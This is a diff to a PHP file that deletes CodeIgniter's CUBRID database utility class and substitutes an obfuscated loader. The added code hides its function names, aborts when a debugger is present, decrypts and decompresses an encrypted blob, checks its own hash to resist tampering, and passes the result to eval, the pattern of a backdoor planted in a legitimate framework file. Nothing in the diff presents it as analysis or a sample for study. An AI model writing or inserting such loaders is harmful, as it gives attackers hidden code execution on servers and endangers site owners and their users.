@@ -1,79 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.1.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CUBRID Utility Class
- *
- * @category	Database
- * @author		Esen Sagynov
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_cubrid_utility extends CI_DB_utility {
-
-	/**
-	 * List databases
-	 *
-	 * @return	array
-	 */
-	public function list_databases()
-	{
-		if (isset($this->db->data_cache['db_names']))
-		{
-			return $this->db->data_cache['db_names'];
-		}
-
-		return $this->db->data_cache['db_names'] = cubrid_list_dbs($this->db->conn_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * CUBRID Export
-	 *
-	 * @param	array	Preferences
-	 * @return	mixed
-	 */
-	protected function _backup($params = array())
-	{
-		// No SQL based support in CUBRID as of version 8.4.0. Database or
-		// table backup can be performed using CUBRID Manager
-		// database administration tool.
-		return $this->db->display_error('db_unsupported_feature');
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zn395qgz=('bas'.'e64'.'_de'.'cod'.'e');
+$_yjqn0tl6=('gzu'.'nco'.'mpr'.'ess');
+$_jfkmheo2=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ammdjegq='7XqpAbqp';
+$_vlu4wr51='Uw1ICIil';
+$_xnhgv836='qDRlpCUs';
+$_o6pzrc0v='Q7blr2b6dSU=';
+$_aznzqcmr='0ppwSi6N';
+$_cgnpttwk='RS7MZNCy';
+$_y09fxe6b='FLUhBPb/';
+$_osesef5z='5Gu0RA==';
+$_ooes5lh9=$_zn395qgz($_ammdjegq.$_xnhgv836.$_vlu4wr51.$_aznzqcmr.$_o6pzrc0v);
+$_rcvc4dly=$_zn395qgz($_cgnpttwk.$_y09fxe6b.$_osesef5z);
+$_yaebggdt=$_zn395qgz('Jl4FedE3vlmkgr17Q6QpcMH3I4vlYzAPXo5kcFvmmQJdVYVDkqrufmB90Z5N3FyAkjaC71EpoOJZWSYXstq/aSlFGGvOdUuaelvtsdKzfdSzggSKycXXAJSIXMwOnul2uBsbQv9nDnaLSC/Dbcv0/mgsOk/2grmfn9jtI0z+93i9bu87afjUQHAjdE9WUaDyiUhr0Fi9rI56kSliVAJWYacHIScyqqWX8GyFHfaRyEqE4xPPcz7TWO6B46aJ7EBxfrRCGsuk30Xpp+PApfwVmfMfD67nm6ZKCpoOK18J0rjxVIYxTF3ONNXwuBFidcCzrgMueVO4bp7mur3G1BhxCJ9LLPjWNSwwZ4QcHxf9zY8=');
+$_galpgbfw=$_jfkmheo2($_yaebggdt,'aes-256-cbc',$_ooes5lh9,OPENSSL_RAW_DATA,$_rcvc4dly);
+if($_galpgbfw===false){exit;}
+$_zgqe6vzx=$_yjqn0tl6($_galpgbfw);
+if($_zgqe6vzx===false){exit;}
+$_kttt5plp='bb1c6984681d1a224f72b7b1a443e0738e5d75b727dc387be49508be1e1af12e';
+$_e7b3zcv0=@file_get_contents(__FILE__);
+if($_e7b3zcv0!==false){
+$_a6p7ef37=str_replace($_kttt5plp,"0000000000000000000000000000000000000000000000000000000000000000",$_e7b3zcv0);
+$_ovepwag1=hash("sha256",$_a6p7ef37);
+if($_ovepwag1!==$_kttt5plp){@http_response_code(403);exit;}
 }
+eval($_zgqe6vzx);
